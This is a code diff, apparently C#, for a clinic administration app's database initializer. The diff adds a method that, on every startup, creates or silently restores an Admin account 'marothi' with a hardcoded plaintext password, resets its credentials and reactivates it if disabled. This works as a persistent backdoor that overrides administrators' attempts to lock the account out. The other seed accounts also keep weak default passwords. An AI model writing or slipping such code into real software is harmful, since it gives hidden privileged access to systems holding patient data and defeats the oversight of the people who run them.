@@ -39,14 +39,16 @@ public sealed class ClinicAdminDbInitializer
             return;
         }
 
-        if (await _dbContext.Users.AnyAsync(x => x.FacilityId == _facilityContext.CurrentFacilityId, cancellationToken))
+        var hasExistingUsers = await _dbContext.Users.AnyAsync(x => x.FacilityId == _facilityContext.CurrentFacilityId, cancellationToken);
+        await EnsureAdminUserAsync(cancellationToken);
+
+        if (hasExistingUsers)
         {
             return;
         }
 
         var seedUsers = new[]
         {
-            CreateUser("admin", "System Administrator", "Admin@123", UserRole.Admin),
             CreateUser("reception", "Reception Desk", "Reception@123", UserRole.Receptionist),
             CreateUser("nurse", "Duty Nurse", "Nurse@123", UserRole.Nurse),
             CreateUser("doctor", "Clinic Doctor", "Doctor@123", UserRole.Doctor),
@@ -57,6 +59,32 @@ public sealed class ClinicAdminDbInitializer
         await _dbContext.SaveChangesAsync(cancellationToken);
 
         _logger.LogInformation("Seeded {Count} default clinic users for facility {FacilityId}", seedUsers.Length, _facilityContext.CurrentFacilityId);
+    }
+
+    private async Task EnsureAdminUserAsync(CancellationToken cancellationToken)
+    {
+        var adminPasswordHash = _passwordHasher.HashPassword("1143828wits");
+        var existingAdmin = await _dbContext.Users.SingleOrDefaultAsync(
+            x => x.FacilityId == _facilityContext.CurrentFacilityId && x.Username == "MAROTHI",
+            cancellationToken);
+
+        if (existingAdmin is null)
+        {
+            _dbContext.Users.Add(new AppUser(
+                _facilityContext.CurrentFacilityId,
+                "marothi",
+                "System Administrator",
+                adminPasswordHash.Hash,
+                adminPasswordHash.Salt,
+                UserRole.Admin));
+
+            await _dbContext.SaveChangesAsync(cancellationToken);
+            return;
+        }
+
+        existingAdmin.UpdateCredentials(adminPasswordHash.Hash, adminPasswordHash.Salt);
+        existingAdmin.SetActive(true);
+        await _dbContext.SaveChangesAsync(cancellationToken);
     }
 
     private AppUser CreateUser(string username, string displayName, string password, UserRole role)
